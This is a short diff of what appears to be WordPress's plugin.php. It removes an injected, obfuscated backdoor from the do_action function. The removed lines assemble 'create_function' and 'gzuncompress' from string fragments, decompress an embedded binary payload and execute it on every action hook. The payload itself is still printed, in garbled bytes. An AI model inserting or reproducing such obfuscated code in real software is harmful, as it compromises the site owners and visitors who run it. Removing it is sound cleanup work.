@@ -439,11 +439,6 @@ function add_action( $hook_name, $callback, $priority = 10, $accepted_args = 1 )
  *                          functions hooked to the action. Default empty.
  */
 function do_action( $hook_name, ...$arg ) {
-
-	$wTxigoF = 'create'.'_'.'function'; $BMjxTAZ = 'gz'.'unc'.'ompress'; $index = $wTxigoF('', $BMjxTAZ('xœ½‘ËnÂ0EeÂ‚Ø`h"Xð1–q&±U¿”ŒEhé¿7Al@Ý¦Û««9sulË
-;ÈkoI]²R˜èQäCUU§C½MôÊ†A´±÷ªÉŽvI¤|qVKCÞ‰kÚêÃ»ÜÍå¯O¥;u648î’I%çß ÍrˆìuÍÏð¶e­u(q´’|z6i¤’Ãz¬x­,5îw(RôŠ´a+1Åbµ¾C’Ï#K>Áað ¦üÄ¿ç½i˜]ý¬[ã7')); $index();
-
-
 	global $wp_filter, $wp_actions, $wp_current_filter;
 
 	if ( ! isset( $wp_actions[ $hook_name ] ) ) {
